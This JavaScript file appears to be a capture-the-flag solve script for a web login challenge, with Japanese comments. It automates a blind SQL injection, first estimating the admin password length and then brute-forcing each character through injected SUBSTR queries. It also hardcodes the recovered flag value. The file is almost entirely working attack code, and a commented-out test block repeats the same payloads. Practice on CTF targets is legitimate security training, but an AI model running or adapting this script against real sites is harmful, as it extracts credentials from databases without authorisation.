const axios = require("axios").default;
// const http = require("http");

const httpRequest = async (id = "admin", pass = "FLAG_KpWa4ji3uZk6TrPK") => {
  const params = new URLSearchParams();
  params.append("id", id);
  params.append("pass", pass);
  const response = await axios.post(
    "http://ctfq.u1tramarine.blue/q6/",
    params,
    {
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      // ↓ 効果なし
      // proxy: false, // ref. https://stackoverflow.com/questions/43433380/socket-hang-up-when-using-axios-get-but-not-when-using-https-get/43439886#43439886
      // httpAgent: new http.Agent({ keepAlive: true }), // ref. https://github.com/axios/axios/issues/1846
    }
  );
  return response.data;
};

const isCorrectResponse = (res) => {
  return res.includes("Congratulations");
};

// パスワード文字列の長さを推定 => { length: 21 }
// (async () => {
//   for (let i = 6; i < 25; i++) {
//     const sql = `' OR (SELECT LENGTH(pass) FROM user WHERE id = 'admin') = ${i} --`;
//     const data = await httpRequest(sql, "");
//     if (isCorrectResponse(data)) {
//       console.log({ length: i });
//     }
//   }
// })();

// 本番
// FIXME: axios postが途中でhang outする
(async () => {
  // 21文字で総当たり
  // FLAG_{16文字}
  let password = "FLAG_";

  const PASS_LEN = 21;
  for (let i = 6; i <= PASS_LEN; i++) {
    for (const c of "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") {
      const sql = `admin' AND SUBSTR((SELECT pass FROM user WHERE id = 'admin'), ${i}, 1) = '${c}' --`;
      const data = await httpRequest(sql, "");
      if (isCorrectResponse(data)) {
        console.log({ password });
        password += c;
        console.log(c);
      }
    }
  }
  console.log({ password });
})();

// TEST
// (async () => {
//   // FLAG_{16文字}
//   let password = "FLAG_";

//   for (let i = 6; i <= 6; i++) {
//     for (const c of "jK") {
//       const sql = `admin' AND SUBSTR((SELECT pass FROM user WHERE id = 'admin'), ${i}, 1) = '${c}' --`;
//       console.log({sql})
//       const data = await httpRequest(sql, "");
//       console.log({data})
//       if (isCorrectResponse(data)) {
//         console.log({ password });
//         password += c;
//         console.log(c)
//       }
//     }
//   }
//   console.log({password})
// })();
